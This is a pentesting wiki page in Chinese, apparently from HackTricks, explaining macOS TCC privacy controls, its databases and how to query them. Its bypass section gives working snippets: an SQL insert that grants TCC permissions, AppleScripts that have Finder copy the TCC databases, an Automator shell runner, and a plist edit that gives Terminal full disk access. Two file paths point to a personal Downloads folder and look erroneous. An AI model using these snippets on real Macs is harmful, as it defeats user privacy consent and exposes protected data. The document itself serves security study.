# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果您在**网络安全公司**工作，想在**HackTricks**上看到您的**公司广告**，或者想要获取**PEASS最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

## **基本信息**

**TCC（透明度、同意和控制）**是macOS中的一种机制，用于**限制和控制应用程序对某些功能的访问**，通常从隐私角度出发。这可能包括位置服务、联系人、照片、麦克风、摄像头、辅助功能、完整磁盘访问等等。

从用户的角度来看，当应用程序想要访问TCC保护的某个功能时，他们会看到TCC的作用。这时，系统会**提示用户**一个对话框，询问他们是否允许访问。

也可以通过用户的**明确意图**来**授权应用程序访问**文件，例如当用户**拖放文件到程序中**时（显然程序应该能够访问它）。

![TCC提示的一个例子](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC**由位于`/System/Library/PrivateFrameworks/TCC.framework/Support/tccd`的**守护进程**处理，并在`/System/Library/LaunchDaemons/com.apple.tccd.system.plist`中配置（注册mach服务`com.apple.tccd.system`）。

有一个**用户模式tccd**，为每个登录的用户运行，定义在`/System/Library/LaunchAgents/com.apple.tccd.plist`中，注册mach服务`com.apple.tccd`和`com.apple.usernotifications.delegate.com.apple.tccd`。

这里您可以看到作为系统和用户运行的tccd：
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
权限**继承自父级**应用程序，且权限基于**Bundle ID**和**Developer ID**进行**跟踪**。

### TCC 数据库

允许/拒绝操作随后存储在一些TCC数据库中：

* 系统范围的数据库位于 **`/Library/Application Support/com.apple.TCC/TCC.db`**。
* 该数据库受到**SIP保护**，因此只有SIP绕过才能写入它。
* 用户TCC数据库 **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** 用于每个用户的偏好设置。
* 该数据库受保护，因此只有具有高TCC权限的进程（如完全磁盘访问）才能写入它（但它不受SIP保护）。

{% hint style="warning" %}
上述数据库也**受TCC保护以限制读取访问**。因此，除非是来自具有TCC特权的进程，否则您**无法读取**您的常规用户TCC数据库。

然而，请记住，具有这些高权限的进程（如**FDA**或**`kTCCServiceEndpointSecurityClient`**）将能够写入用户的TCC数据库。
{% endhint %}

* 还有第**三个**TCC数据库位于 **`/var/db/locationd/clients.plist`**，用于指示允许**访问位置服务**的客户端。
* 受SIP保护的文件 **`/Users/carlospolop/Downloads/REG.db`**（也受TCC保护以限制读取访问），包含所有**有效TCC数据库**的**位置**。
* 受SIP保护的文件 **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（也受TCC保护以限制读取访问），包含更多TCC授予的权限。
* 受SIP保护的文件 **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（但任何人都可读）是需要TCC例外的应用程序的允许列表。&#x20;

{% hint style="success" %}
**iOS**中的TCC数据库位于 **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
**通知中心UI**可以在系统TCC数据库中进行**更改**：

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

然而，用户可以使用命令行工具 **`tccutil`** **删除或查询规则**。
{% endhint %}

#### 查询数据库

{% tabs %}
{% tab title="用户数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="系统数据库" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
检查这两个数据库，您可以检查应用程序已允许、已禁止或没有的权限（它将请求权限）。
{% endhint %}

* **`service`** 是 TCC **权限** 字符串表示
* **`client`** 是具有权限的 **bundle ID** 或 **路径到二进制**
* **`client_type`** 表示它是 Bundle Identifier(0) 还是绝对路径(1)

<details>

<summary>如果是绝对路径该如何执行</summary>

只需执行 **`launchctl load your_bin.plist`**，使用类似的 plist：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** 可以有不同的值：denied(0), unknown(1), allowed(2), 或 limited(3)。
* **`auth_reason`** 可以取以下值：Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** 字段用于指示如何验证要执行的二进制文件并授予 TCC 权限：
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* 有关表格**其他字段**的更多信息，请[**查看此博客文章**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。

您还可以在 `系统偏好设置 --> 安全性与隐私 --> 隐私 --> 文件与文件夹` 中检查**已授予应用程序的权限**。

{% hint style="success" %}
用户_可以_使用 **`tccutil`** **删除或查询规则**。&#x20;
{% endhint %}

#### 重置 TCC 权限
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 签名检查

TCC **数据库** 存储应用程序的 **Bundle ID**，但它也 **存储** 有关 **签名** 的**信息**，以**确保**请求使用权限的应用程序是正确的。

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
因此，使用相同名称和捆绑 ID 的其他应用程序将无法访问授予其他应用程序的权限。
{% endhint %}

### 权限和 TCC 权限

应用程序**不仅需要** **请求**并已被**授予访问**某些资源的权限，它们还需要**具有相关的权限**。\
例如，**Telegram** 拥有权限 `com.apple.security.device.camera` 来请求**访问摄像头**。一个**没有**这个**权限的应用程序将无法**访问摄像头（用户甚至不会被询问权限）。

然而，对于应用程序来说，要**访问**某些**用户文件夹**，如 `~/Desktop`、`~/Downloads` 和 `~/Documents`，它们**不需要**具有任何特定的**权限**。系统将透明地处理访问并在需要时**提示用户**。

苹果的应用程序**不会生成提示**。它们在其**权限**列表中包含**预先授予的权利**，这意味着它们将**永远不会生成弹出窗口**，**也不**会出现在任何**TCC 数据库**中。例如：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
这将避免日历请求用户访问提醒事项、日历和地址簿。

{% hint style="success" %}
除了一些关于权限的官方文档外，还可以在[**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)找到关于权限的**非官方有趣信息**。
{% endhint %}

一些TCC权限包括：kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos... 没有公开的列表定义了所有这些权限，但你可以查看这个[**已知权限列表**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service)。

### 敏感未受保护的地方

* $HOME（本身）
* $HOME/.ssh、$HOME/.aws 等
* /tmp

### 用户意图 / com.apple.macl

如前所述，可以通过将文件拖放到应用程序上来**授予应用程序对文件的访问权限**。这种访问不会在任何TCC数据库中指定，而是作为文件的**扩展** **属性**。此属性将**存储**允许应用程序的UUID：
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
值得注意的是，**`com.apple.macl`** 属性是由 **Sandbox** 管理的，而不是 tccd。

另外请注意，如果您将允许计算机中某个应用的 UUID 的文件移动到另一台计算机，因为同一个应用将有不同的 UIDs，它不会授予那个应用访问权限。
{% endhint %}

扩展属性 `com.apple.macl` **无法像其他扩展属性那样被清除**，因为它受到 **SIP** 的保护。然而，正如[**这篇文章中解释的**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)，通过对文件进行**压缩**，**删除**然后**解压**，可以禁用它。

## TCC 权限提升与绕过

### 插入到 TCC

如果您在某个时刻设法获得了对 TCC 数据库的写入权限，您可以使用类似以下的方法来添加一个条目（移除注释）：

<details>

<summary>插入到 TCC 示例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### 自动化至FDA\*

TCC中自动化权限的名称是：**`kTCCServiceAppleEvents`**\
这个特定的TCC权限还指示了可以在TCC数据库中管理的**应用程序**（所以权限并不允许管理所有内容）。

**Finder**是一个**始终拥有FDA**的应用程序（即使它没有出现在UI中），所以如果你拥有对它的**自动化**权限，你可以滥用它的权限来**让它执行一些操作**。\
在这种情况下，你的应用程序将需要对**`com.apple.Finder`**的**`kTCCServiceAppleEvents`**权限。

{% tabs %}
{% tab title="窃取用户的TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}

{% tab title="窃取系统的 TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

您可以滥用此功能来**编写您自己的用户TCC数据库**。

{% hint style="warning" %}
拥有此权限，您将能够**请求finder访问受TCC限制的文件夹**并向您提供文件，但据我所知，您**无法使Finder执行任意代码**以完全滥用其FDA访问权限。

因此，您将无法滥用完整的FDA能力。
{% endhint %}

这是获取对Finder自动化权限的TCC提示：

<figure><img src="../../../../.gitbook/assets/image (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
请注意，因为**Automator**应用程序具有TCC权限**`kTCCServiceAppleEvents`**，它可以**控制任何应用程序**，如Finder。所以，如果您有控制Automator的权限，您也可以使用下面的代码来控制**Finder**：
{% endhint %}

<details>

<summary>在Automator内获取一个shell</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

同样的情况发生在**Script Editor app**，它可以控制Finder，但使用AppleScript你不能强制它执行脚本。

### **端点安全客户端到FDA**

如果你有**`kTCCServiceEndpointSecurityClient`**，你就拥有FDA。结束。

### 系统策略SysAdmin文件到FDA

**`kTCCServiceSystemPolicySysAdminFiles`** 允许**更改**用户的**`NFSHomeDirectory`** 属性，这改变了他的家目录，因此允许**绕过TCC**。

### 用户TCC数据库到FDA

获取对**用户TCC**数据库的**写权限**，你**不能**授予自己**`FDA`** 权限，只有系统数据库中的那个可以授予该权限。

但是你**可以**给自己**`自动化权限到Finder`**，并滥用前面的技术来升级到FDA\*。

### **FDA到TCC权限**

**完全磁盘访问**在TCC中的名称是**`kTCCServiceSystemPolicyAllFiles`**

我不认为这是一个真正的权限提升，但以防你觉得它有用：如果你控制了一个拥有FDA的程序，你可以**修改用户的TCC数据库并给自己任何访问权限**。这可以作为一个持久性技术，以防你可能失去你的FDA权限。

### **SIP绕过到TCC绕过**

系统**TCC数据库**受到**SIP**的保护，这就是为什么只有拥有**指定权限的进程才能修改**它。因此，如果攻击者找到了一个**SIP绕过**一个**文件**（能够修改受SIP限制的文件），他将能够：

* **移除TCC数据库的保护**，并给自己所有TCC权限。例如，他可以滥用以下任何文件：
* TCC系统数据库
* REG.db
* MDMOverrides.plist

然而，还有另一种利用这个**SIP绕过来绕过TCC**的方法，文件`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` 是一个允许需要TCC例外的应用程序的列表。因此，如果攻击者能够**移除这个文件的SIP保护**并添加他**自己的应用程序**，该应用程序将能够绕过TCC。\
例如添加终端：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC 绕过

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## 参考资料

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？你想在**HackTricks**看到你的**公司广告**吗？或者你想要访问**最新版本的 PEASS 或下载 HackTricks 的 PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏。
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **推特** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注我。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
